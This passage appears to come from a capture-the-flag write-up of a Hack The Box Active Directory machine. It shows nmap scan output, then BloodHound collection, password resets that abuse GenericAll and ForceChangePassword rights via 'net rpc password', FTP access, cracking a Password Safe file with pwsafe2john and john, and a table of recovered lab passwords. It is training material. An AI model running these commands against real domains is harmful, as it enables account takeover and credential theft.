+</span></span><span class="line"><span class="cl"><span class="mi">21</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span> <span class="n">ftp</span>           <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">ftpd</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ftp</span><span class="o">-</span><span class="n">syst</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">SYST</span><span class="p">:</span> <span class="n">Windows_NT</span>
+</span></span><span class="line"><span class="cl"><span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span> <span class="n">domain</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Simple</span> <span class="n">DNS</span> <span class="n">Plus</span>
+</span></span><span class="line"><span class="cl"><span class="mi">88</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span> <span class="n">kerberos</span><span class="o">-</span><span class="n">sec</span>  <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Kerberos</span> <span class="p">(</span><span class="n">server</span> <span class="n">time</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">02</span> <span class="mi">19</span><span class="p">:</span><span class="mi">09</span><span class="p">:</span><span class="mi">45</span><span class="n">Z</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>   <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
+</span></span><span class="line"><span class="cl"><span class="mi">389</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span> <span class="n">ldap</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Active</span> <span class="n">Directory</span> <span class="n">LDAP</span> <span class="p">(</span><span class="n">Domain</span><span class="p">:</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb0</span><span class="o">.</span><span class="p">,</span> <span class="n">Site</span><span class="p">:</span> <span class="n">Default</span><span class="o">-</span><span class="n">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span> <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="err">?</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl"><span class="mi">464</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span> <span class="n">kpasswd5</span><span class="err">?</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl"><span class="mi">593</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span> <span class="n">ncacn_http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span> <span class="n">over</span> <span class="n">HTTP</span> <span class="mf">1.0</span>
+</span></span><span class="line"><span class="cl"><span class="mi">636</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span> <span class="n">tcpwrapped</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3268</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span> <span class="n">ldap</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Active</span> <span class="n">Directory</span> <span class="n">LDAP</span> <span class="p">(</span><span class="n">Domain</span><span class="p">:</span> <span class="n">administrator</span><span class="o">.</span><span class="n">htb0</span><span class="o">.</span><span class="p">,</span> <span class="n">Site</span><span class="p">:</span> <span class="n">Default</span><span class="o">-</span><span class="n">First</span><span class="o">-</span><span class="n">Site</span><span class="o">-</span><span class="n">Name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3269</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span> <span class="n">tcpwrapped</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl"><span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span> <span class="n">http</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span>
+</span></span><span class="line"><span class="cl"><span class="mi">9389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span> <span class="n">mc</span><span class="o">-</span><span class="n">nmf</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="o">.</span><span class="n">NET</span> <span class="n">Message</span> <span class="n">Framing</span>
+</span></span><span class="line"><span class="cl"><span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">http</span>          <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49665</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49666</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49668</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">58289</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">61803</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">ncacn_http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span> <span class="n">over</span> <span class="n">HTTP</span> <span class="mf">1.0</span>
+</span></span><span class="line"><span class="cl"><span class="mi">61807</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">61809</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">61831</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="mi">61864</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span> <span class="n">msrpc</span>         <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+</span></span><span class="line"><span class="cl"><span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">DC</span><span class="p">;</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">date</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">02</span><span class="n">T19</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">45</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="n">N</span><span class="o">/</span><span class="n">A</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> <span class="mi">3</span><span class="n">h00m00s</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">p2p</span><span class="o">-</span><span class="n">conficker</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Checking</span> <span class="k">for</span> <span class="n">Conficker</span><span class="o">.</span><span class="n">C</span> <span class="ow">or</span> <span class="n">higher</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Check</span> <span class="mi">1</span> <span class="p">(</span><span class="n">port</span> <span class="mi">35406</span><span class="o">/</span><span class="n">tcp</span><span class="p">):</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Couldn</span><span class="s1">&#39;t connect)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Check</span> <span class="mi">2</span> <span class="p">(</span><span class="n">port</span> <span class="mi">29600</span><span class="o">/</span><span class="n">tcp</span><span class="p">):</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Couldn</span><span class="s1">&#39;t connect)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Check</span> <span class="mi">3</span> <span class="p">(</span><span class="n">port</span> <span class="mi">52617</span><span class="o">/</span><span class="n">udp</span><span class="p">):</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Failed</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">Check</span> <span class="mi">4</span> <span class="p">(</span><span class="n">port</span> <span class="mi">61528</span><span class="o">/</span><span class="n">udp</span><span class="p">):</span> <span class="n">CLEAN</span> <span class="p">(</span><span class="n">Timeout</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="mi">0</span><span class="o">/</span><span class="mi">4</span> <span class="n">checks</span> <span class="n">are</span> <span class="n">positive</span><span class="p">:</span> <span class="n">Host</span> <span class="ow">is</span> <span class="n">CLEAN</span> <span class="ow">or</span> <span class="n">ports</span> <span class="n">are</span> <span class="n">blocked</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="ow">and</span> <span class="n">required</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="n">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
+</span></span><span class="line"><span class="cl"><span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Wed Apr  2 12:10:51 2025 -- 1 IP address (1 host up) scanned in 75.49 seconds</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>From the scan, I find various services running, including FTP (port 21), DNS (port 53), Kerberos (port 88), SMB (ports 135, 139, 445), and WINRM (port 5985), among others. If I use Olivia&rsquo;s credentials, I can access the machine with WinRM, but there will not be any information on the machine that leads to a possible privilege escalation path. As I mentioned before, this is a pure AD machine.</p>
+<h3>Running Bloodhound as Olivia<span class="hx:absolute hx:-mt-20" id="running-bloodhound-as-olivia"></span>
+    <a href="#running-bloodhound-as-olivia" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Since this is an Active Directory environment and I have credentials I run <strong>Bloodhound-python</strong> to gather information about the domain and find possible lateral movement paths.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -u <span class="s1">&#39;olivia&#39;</span> -p <span class="s1">&#39;ichliebedich&#39;</span> -ns 10.10.11.42 -d administrator.htb -c all --zip</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>After uploading the data to Bloodhound, I set Olivia&rsquo;s user as owned and it&rsquo;s possible to see that Olivia has <em><strong>GenericAll</strong></em> rights over <em>Michael</em></p>
+<p><img src="/assets/images/HTB/Administrator/Admin1.png" alt="Alt text"  loading="lazy" /></p>
+<h2>Foothold<span class="hx:absolute hx:-mt-20" id="foothold"></span>
+    <a href="#foothold" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>GenericAll over Michael.<span class="hx:absolute hx:-mt-20" id="genericall-over-michael"></span>
+    <a href="#genericall-over-michael" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>In simple words, <code>GenericAll</code> rights give full control of the object (user, computer, group, etc.), thus allowing the trustee to manipulate the target however they want. In this case, I am going to use Olivia&rsquo;s credentials to abuse the GenericAll privilege and change Michael&rsquo;s password.</p>
+<ul>
+<li>For more information on GenericAll, please visit <a href="https://bloodhound.specterops.io/resources/edges/generic-all" target="_blank" rel="noopener">SpectreOps - Generic All</a></li>
+</ul>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net rpc password <span class="s2">&#34;michael&#34;</span> <span class="s2">&#34;wzk123.&#34;</span> -U <span class="s2">&#34;administrator.htb&#34;</span>/<span class="s2">&#34;olivia&#34;</span>%<span class="s2">&#34;ichliebedich&#34;</span> -S <span class="s2">&#34;10.10.11.42&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Verify the password did change:</p>
+<p><img src="/assets/images/HTB/Administrator/Admin2.png" alt="Alt text"  loading="lazy" /></p>
+<h3>ForceChangePassword over Benjamin.<span class="hx:absolute hx:-mt-20" id="forcechangepassword-over-benjamin"></span>
+    <a href="#forcechangepassword-over-benjamin" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>I mark Michael as owned in Bloodhound and invetigating the user I notice he has <code>ForceChangePassword</code> rights over Benjamin.</p>
+<ul>
+<li>For more information on ForceChangePassword, please visit <a href="https://bloodhound.specterops.io/resources/edges/force-change-password" target="_blank" rel="noopener">SpectreOps - ForceChangePassword</a></li>
+</ul>
+<p><img src="/assets/images/HTB/Administrator/Admin3.png" alt="Alt text"  loading="lazy" /></p>
+<p>This privilege as its name establishes it, allows to <em>reset the password</em> of the target user without knowing the current password of that user.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net rpc password <span class="s2">&#34;benjamin&#34;</span> <span class="s2">&#34;wzk123.&#34;</span> -U <span class="s2">&#34;administrator&#34;</span>/<span class="s2">&#34;michael&#34;</span>%<span class="s2">&#34;wzk123.&#34;</span> -S <span class="s2">&#34;10.10.11.42&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Verify the password did change:</p>
+<p><img src="/assets/images/HTB/Administrator/Admin4.png" alt="Alt text"  loading="lazy" /></p>
+<h3>FTP Access.<span class="hx:absolute hx:-mt-20" id="ftp-access"></span>
+    <a href="#ftp-access" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>From the previous enumeration, we noted that FTP does not accept anonymous login. Since Bloodhound did not show more &ldquo;options&rdquo; to move laterally I decided to check the open services with the two new users I got.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp 10.10.11.42
+</span></span><span class="line"><span class="cl"><span class="c1">#user: benjamin</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#pass: wzk123.</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Using the new credentials that I set on Benjamin I can access the FTP server and I was able to find a <code>.psafe3</code> file</p>
+<p><img src="/assets/images/HTB/Administrator/Admin5.png" alt="FPT share access"  loading="lazy" /></p>
+<h2>PasswordSafe3 File.<span class="hx:absolute hx:-mt-20" id="passwordsafe3-file"></span>
+    <a href="#passwordsafe3-file" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>Extracting &amp; Cracking psafe Hash.<span class="hx:absolute hx:-mt-20" id="extracting--cracking-psafe-hash"></span>
+    <a href="#extracting--cracking-psafe-hash" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Psafe3 files are Password Safe 3 files which is a credential manager application similar to KeePass, in this case what is necessary to do is crack the password that is protecting the psafe3 file, for this I will use john to extract/crack the password. With the help of <code>pwsafe2john</code> I extract the hash of the file in john format, and with john (John the Reaper) I am able to crack its password.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwsafe2john Backup.psafe3 &gt; Backup_hash</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/images/HTB/Administrator/Admin6.png" alt="psafe hash"  loading="lazy" /></p>
+<p>Now with the hash file in the correct format, I can crack the psafe3 file password.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john Backup_hash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+    <div class="success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/images/HTB/Administrator/Admin7.png" alt="john cracked hash"  loading="lazy" /></p>
+<ul>
+<li> <code>tekieromucho</code>
+ </li>
+</ul>
+<p>Upon entering the correct password I was able to open the backup file and I can retrieve 3 encrypted passwords.</p>
+<h3>Checking .psafe3 content.<span class="hx:absolute hx:-mt-20" id="checking-psafe3-content"></span>
+    <a href="#checking-psafe3-content" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><ul>
+<li>Download passwordsafe3 for linux <a href="https://github.com/pwsafe/pwsafe/blob/master/README.LINUX.md" target="_blank" rel="noopener">here</a>.</li>
+</ul>
+<p><img src="/assets/images/HTB/Administrator/Admin8.png" alt="open psafe backup"  loading="lazy" /></p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>USER</strong></th>
+          <th><strong>PASSWORD</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>emily        </td>
+          <td>UXLCI5iETUsIBoFVTj8yQFKoHjXmb  </td>
+      </tr>
+      <tr>
+          <td>emma          </td>
+          <td>WwANQWnmJnGV07WQN8bMS7FMAbjNur</td>
+      </tr>
+      <tr>
+          <td>alexander<br></td>
+          <td>UrkIbagoxMyUGw0aPlj9B0AXSea4Sw</td>
+      </tr>
+  </tbody>
+</table>
+<p>I got valid credentials with Emily.</p>
